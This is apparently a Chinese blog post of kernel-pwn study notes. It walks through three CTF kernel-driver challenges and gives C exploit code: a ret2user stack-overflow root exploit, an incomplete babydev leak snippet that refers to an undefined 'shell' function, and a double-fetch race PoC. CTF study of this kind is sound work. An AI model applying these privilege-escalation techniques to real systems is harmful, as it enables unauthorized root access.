---
layout:     post
title:      kernel pwn入门之路（二）
subtitle:   例题复现
date:       2020-01-04
author:     X1ng
header-img: kernel.jpg
catalog: true
tags:
    - kernel pwn
    - 学习笔记

---

只会做几个烂大街的堆题目，，比赛堆题签个到走人

这好吗？这不好，，所以赶紧学学kernel pwn，记个笔记

非常感谢PKFXXXX学长的帮助，，学长从栈溢出带着我学到pwn内核or2

## 

## 例题

### XMAX 2019 level1

题目只给了4个文件

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvo7aqyxdj30m805w3yf.jpg)

ida打开baby.ko

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvmg0ex8vj31ty0u040o.jpg)

有三个函数，其中init_module和cleanup_module用来注册和移除驱动，可以看到注册的驱动叫baby

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvmfipl6dj31ng0baacd.jpg)

分析sub_0

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvmnlzd0dj31go0u0q4a.jpg)

`copy_from_user`存在栈溢出漏洞

解包文件系统

```shell
mkdir extracted; cd extracted
cpio -i --no-absolute-filenames -F ../initramfs.cpio
```

找到rcS文件

```shell
find . | grep "rcS"
vim ./etc/init.d/rcS
```

修改setsid一行的1000为0

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glvoeax602j31qo0jutbi.jpg)

重新打包文件系统

```shell
find . | cpio -o --format=newc > ../initramfs.cpio
cd ..
```

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glvoezj2qij31200q0gmo.jpg)

在`startvm.sh`末尾加上`-gdb tcp::1234`后启动内核

```shell
chmod +x startvm.sh
./startvm.sh
```

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glvotg6k6ej31s20l275u.jpg)

可以看到驱动加载基址为`0xffffffffc0002000`，`prepare_kernel_cred`地址为`ffffffff810b9d80`，`commit_creds`地址为`ffffffff810b99d0`

但是要进行下断点调试的话，由于这题ko文件没有符号表，只能通过地址来下断点，在ida里可以看到存在漏洞函数sub_0，相对基地址偏移为0，所以只需要在`0xffffffffc0002000`下断点就可以

>对于有时候ida中的地址不准确，可以通过miscdevice结构体
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyapez50j30gm06v0sz.jpg)
>
>其中的file_operations结构体
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyb2vhp3j30tg0hrq5v.jpg)
>
>找到漏洞函数的地址
>
>比如这题的
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyle3wfoj30u01gb7wh.jpg)
>
>就可以通过
>
>```shell
>cat /proc/kallsyms | grep baby
>```
>
>可以看到三个函数的地址
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyiztotjj30lm03qweq.jpg)
>
>之后在gdb中找到`init_module中`函数中调用的`misc_register(&off_120);`
>
>通过偏移找到存在漏洞函数的地址

由于什么保护都没有打开，可以直接ret2user

所以利用思路就是在exp代码中构造提权函数`commit_creds(prepare_kernel_cred(0));`以及恢复寄存器的函数，计算好偏移后直接覆盖内核中的返回地址为exp中用户态代码，完成提权

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwh3lm4ekj30u00wnjuh.jpg)

exp：

```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define KERNCALL __attribute__((regparm(3)))

void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810b9d80; // TODO:change it
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810b99d0; // TODO:change it

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void shell()
{
	system("/bin/sh");
	exit(0);
}

int get()
{
	commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq   %0;"
		"pushq   %1;"
		"pushq   %2;"
		"pushq   %3;"
		"pushq   $shell;"
		"pushq   $0;"
		"swapgs;"
		"popq    %%rbp;"
		"iretq;"
		::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs)
	);
}


int main()
{
	save_stat();
	printf("[+]open drive\n");
	int fd = open("/dev/baby",0);
	if (fd < 0) {
		printf("[-] bad open device\n");
		exit(-1);
	}

	void *buf[0x100];
	printf("&buf : %x\n", &buf);
	for(int i = 0; i<0x12; i++){
		buf[i] = &get;
		printf("[+]buf[%d] = %x\n", i, buf[i]);
	}

	printf("[+]call ioctl\n");
	ioctl(fd, 0x6001, buf);

	return 0;
}
```





### 祥云杯2020 babydev

比赛时一脸懵逼

题目给了五个文件

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwhomgpkqj30sc05s74a.jpg)

ida打开ko文件

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwho5rgbtj31rj0u0tgr.jpg)

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwhohmcg3j31nc0mawjr.jpg)

可以看到注册的驱动叫mychrdev，总体实现的功能是一个字符设备的驱动程序，`kmalloc_order_trace`动态分配内存来保存文件的数据，其地址保存在mydata指针变量，根据文件读写指针对文件的数据进行读写，驱动程序中主要维护三个指针

- 在其file结构体的0x68偏移处存放文件读写指针
- 在mydata+0x10000中存放文件开头相对于mydata的偏移
- 在mydata+0x10008中存放文件结尾相对于mydata的偏移

file结构体

```c
struct file {
     union {
         struct llist_node    fu_llist;
         struct rcu_head     fu_rcuhead;
     } f_u;
     struct path        f_path;
     struct inode        * f_inode;    / * cached value * /
     const struct file_operations    * f_op;
 
     / *
      * Protects f_ep_links, f_flags.
      * Must not be taken from IRQ context.
      * /
     spinlock_t        f_lock;
     enum rw_hint        f_write_hint;
     atomic_long_t        f_count;
     unsigned int         f_flags;
     fmode_t            f_mode;
     struct mutex        f_pos_lock;
     loff_t            f_pos;                      //偏移 0x68
     struct fown_struct    f_owner;
     const struct cred    * f_cred;                //这里指向当前进程的cred结构体，偏移 0x90
     struct file_ra_state    f_ra;
 
     u64            f_version;
#ifdef CONFIG_SECURITY
     void            * f_security;
#endif
     / * needed for tty driver, and maybe others * /
     void            * private_data;
 
#ifdef CONFIG_EPOLL
     / * Used by fs / eventpoll.c to link all the hooks to this file * /
     struct list_head    f_ep_links;
     struct list_head    f_tfile_llink;
#endif /* #ifdef CONFIG_EPOLL */
     struct address_space    * f_mapping;
     errseq_t        f_wb_err;
     errseq_t        f_sb_err; / * for syncfs * /
} __randomize_layout
   __attribute__((aligned( 4 )));    / * lest something weird decides that 2 is OK * /
```

所以文件指针就是f_pos

驱动中定义了`open`函数、`read`函数、`write`函数、`llseek`函数以及`ioctl`函数

**`open`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwwvge9xej31ai0jowgp.jpg)

---

申请了0x14大小的内存空间用于存放current_task所指向的结构体中的一个成员指针所指的值以及一个成员指针

```c
struct lima_sched_task *current_task;

struct lima_sched_task {
	struct drm_sched_job base;

	struct lima_vm *vm;
	void *frame;

	struct xarray deps;
	unsigned long last_dep;

	struct lima_bo **bos;
	int num_bos;

	bool recoverable;
	struct lima_bo *heap;

	/* pipe fence */
	struct dma_fence *fence;
};
```

---



**`read`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glwxgqm9fmj31ev0u0dil.jpg)

a2是一个用户空间地址，a3是读取的长度size，a4是文件指针（可以通过linux kernel源码查看read函数调用接口）

`mydata + 0x10000`和`mydata + 0x10008`保存的都是0到0xffff 之间的数字，分别表示文件的头和尾相对于mydata的偏移

实现的功能是在满足条件的情况下将内核空间`v7 + v6 + mydata`处（也就是mydata+文件起始偏移+文件指针处）的数据读取到用户空间a2，并且文件指针会向后移动

**`write`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwgy1gmai971cqsj31i40u0tb5.jpg)

a2是一个用户空间地址，a3是读取的长度size，a4类似于文件指针（可以通过linux kernel源码查看write函数调用接口）

`mydata + 0x10000`和`mydata + 0x10008`保存的都是0到0xffff 之间的数字，分别表示文件的头和尾相对于mydata的偏移

实现的功能是在满足条件的情况下将用户空间地址a2处长度为a3的数据传入内核空间`(mydata+0x10000) + v5 + mydata`处（也就是mydata+文件起始偏移+文件指针处），文件结尾`(mydata+0x10008)`加上写入的字节数，并且文件指针会向后移动

**`llseek`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glzbg71s9ej31i00u0tbs.jpg)

当`a3==0`时，函数功能是设置文件读写指针为a2

当`a3==1`时，函数功能是将文件读写指针跳转到`当前地址+a2`的位置

当`a3==2`时，函数功能是将文件读写指针跳转到文件倒数第`|a2|`（这里a2需要是负数）个位置

不知道是不是调试环境的原因，用户态调用时应该调用`lseek64`函数

**`ioctl`函数**

只定义了`0x1111`操作

![](https://tva1.sinaimg.cn/large/0081Kckwgy1gmai5893nsj31i00u0wj5.jpg)

可以将 file结构体偏移0xc8位置的指针 所指向内存中的数据 传递到用户空间

看一下泄露出的数据中有什么信息

![](https://tva1.sinaimg.cn/large/0081Kckwly1gmbphyspz1j313f0u0wgw.jpg)

其中`rsi+0x10`处有一个内核栈地址的相对偏移，`rsi+0x20`处保存着一个地址，经过测试可以知道是用来保存文件数据的mydata指针指向的地址

![](https://tva1.sinaimg.cn/large/0081Kckwgy1gmbpjox4cfj30tk09s3zc.jpg)

漏洞点在write函数，如果`文件读写指针+写入字节数>0x10000`，进入的if分支，会把写入字节数缩小为0x10000与文件读写指针的差值



打开start.sh加上`-gdb tcp::1234`

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwk4q5khrj310m0pygnt.jpg)

可以看到开启了`smep`和`smap`，没有开启`kalsr`

解包文件系统

```shell
mkdir extracted; cd extracted
cpio -i --no-absolute-filenames -F ../core.cpio
```

这道题没有`rcS`文件，用于初始化的文件是根目录下的`init`

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glwib4l6z3j31380ieta5.jpg)

修改init文件中setsid一行的1000为0

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glwi8mug29j31am0oaad4.jpg)

打包文件系统

```shell
find . | cpio -o --format=newc > ../core.cpio
cd ..
```

打开qemu

```
./start.sh
```

gdb打开

```shell
gdb mychrdev.ko
add-symbol-file ./mychrdev.ko 0xffffffffc0000000
target remote :1234
```













```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define KERNCALL __attribute__((regparm(3)))

void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff8108d690; // TODO:change it
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff8108d340; // TODO:change it

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void shell1()
{
	system("/bin/sh");
	exit(0);
}

int get()
{
	commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq   %0;"
		"pushq   %1;"
		"pushq   %2;"
		"pushq   %3;"
		"pushq   $shell;"
		"pushq   $0;"
		"swapgs;"
		"popq    %%rbp;"
		"iretq;"
		::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs)
	);
}


int main()
{
	int buf[1000];
	save_stat();
	printf("[+]open drive\n");
	int fd = open("/dev/mychrdev",0);
	if (fd < 0) {
		printf("[-] bad open device\n");
		exit(-1);
	}
	ioctl(fd,0x1111,buf);
	printf("%s",buf);

	return 0;
}
```





## 2018 0CTF Finals Baby Kernel

### Double Fetch漏洞原理

Double Fetch漏洞属于条件竞争漏洞，一个用户态线程准备的数据通过系统调用进入内核，进入内核的时候进行安全检查（比如缓冲区大小、指针可用性等），当检查通过后进行实际处理之前，另一个用户态线程可以创造条件竞争，对那个已经将通过了检查的用户态数据进行篡改，使得数据在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升

### 程序逻辑分析

ida打开驱动程序baby.ko

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjz181zxl5j31db0u0tjs.jpg)

可以看到if语句的两个分支，第一个分支可以输出flag的地址，第二个分支有两个检查，检查通过则与内存中flag逐字节对比，全部一致则输出flag

双击flag可以直接在内存中看到flag，，但是复现的主要目的是学习Double Fetch漏洞，所以需要绕过检查来让程序打印出flag

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjy5t0fkdoj31na04wwfa.jpg)

检查函数如下

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjy5tdu7tyj31db0u045w.jpg)

函数逻辑是判断a1+a2是否小于a3，小于a3返回0，通过检查

通过`*(_QWORD *)v5`和`*(_DWORD *)(v5 + 8) == strlen(flag)`我们很容易推出v5这个结构体包含的是一个flag的地址及其长度，为了与内核中的flag区分，这里记为flag1

```c
struct v5{
    char *flag1;
    size_t len;
};
```

用gdb调试发现，作为__chk_range_not_ok函数的第三个参数的是`0x7ffffffff000`

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjz0xghsr3j31eq06g74v.jpg)

可以推测该函数用来判断前面两个参数的数据指针是否为用户态数据（因为如果可以是内核态数据的话，就可以让`v5->flag1 = flag`，直接通过后面的比较操作，从而打印出flag）

### 漏洞分析

漏洞在于 对v5的地址是否在内核中的检查 和 让flag1和flag逐字节比较 两个操作不是一个原子操作，也就是说可以在 对v5地址是否在内核中的检查 之后，在 让flag1和flag逐字节比较 之前将`v5->flag1`中的地址改成内核中的flag的地址，通过验证

所以思路就是先利用驱动提供的0x6666分支，获取内核中flag的加载地址（这个地址可以通过dmesg命令查看）；然后构造一个符合0x1337分支的数据结构，其中len可以从ida中`.data`上直接数出来为33，此时的`v5->flag1`指向一个用户空间地址；再调用`pthread_create`创建一个恶意线程,不断的将flag1所指向的用户态地址修改为内核中的flag地址以制造竞争条件,从而使其通过驱动中的逐字节比较检查,输出flag内容

---

```c
int pthread_create(pthread_t *tidp, const pthread_attr_t *attr, void *(*start_rtn)(void *), void *arg);
```

第一个参数为指向线程[标识符](https://baike.baidu.com/item/标识符)的[指针](https://baike.baidu.com/item/指针)。

第二个参数用来设置线程属性。

第三个参数是线程运行函数的起始地址。

最后一个参数是运行函数的参数。

栗子：

```c
#include <pthread.h>

void change_flag_addr(void *a){
    struct v5 *s = a;
    while(finish == 1){
        s->flag = flag_addr;
    }
}

int main()
{
	struct v5 t;
	pthread_t t1;
	pthread_create(&t1,NULL,change_flag_addr,&t); 
}

```



---

贴一下钞sir师傅的poc：

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>

unsigned long long flag_addr;
int Time = 1000;
int finish = 1;

struct v5{
    char *flag;
    size_t len;
};

//change the user_flag_addr to the kernel_flag_addr
void change_flag_addr(void *a){
    struct v5 *s = a;
    while(finish == 1){
        s->flag = flag_addr;
    }
}

int main()
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    pthread_t t1;
    char buf[201]={0};
    char m[] = "flag{AAAA_BBBB_CC_DDDD_EEEE_FFFF}";     //user_flag
    char *addr;
    int file_addr,fd,ret,id,i;
    struct v5 t;
    t.flag = m;
    t.len = 33;
    fd = open("/dev/baby",0);
    ret = ioctl(fd,0x6666);
    system("dmesg | grep flag > /tmp/sir.txt");     //get kernel_flag_addr
    file_addr = open("/tmp/sir.txt",O_RDONLY);
    id = read(file_addr,buf,200);
    close(file_addr);
    addr = strstr(buf,"Your flag is at ");
    if(addr)
        {
            addr +=16;
            flag_addr = strtoull(addr,addr+16,16);
            printf("[*]The flag_addr is at: %p\n",flag_addr);
        }
    else
    {
            printf("[*]Didn't find the flag_addr!\n");
            return 0;
    }
    pthread_create(&t1,NULL,change_flag_addr,&t);   //Malicious thread
    for(i=0;i<Time;i++){
        ret = ioctl(fd,0x1337,&t);
        t.flag = m;     //In order to pass the first inspection
    }
    finish = 0;
    pthread_join(t1,NULL);
    close(fd);
    printf("[*]The result:\n");
    system("dmesg | grep flag");
    return 0;
}
```

PS:

>1. 配置QEMU启动参数时,不要开启SMAP保护，否则在内核中直接访问用户态数据会引起kernel panic…
>
>2. 配置QEMU启动参数时，需要配置为非单核单线程启动，不然无法触发poc中的竞争条件,具体操作是在启动参数中增加其内核数选项，如:
>
>    ```shell
>    -smp 2,cores=2,threads=1  \
>    ```



>参考资料：
>
>[Linux Kernel Pwn 初探](https://xz.aliyun.com/t/7625)
>
>[祥云杯2020 babydev](http://www.yxfzedu.com/rs_show/702)
>
>[祥云杯2020 babydev详解](https://www.anquanke.com/post/id/223468)
>
>

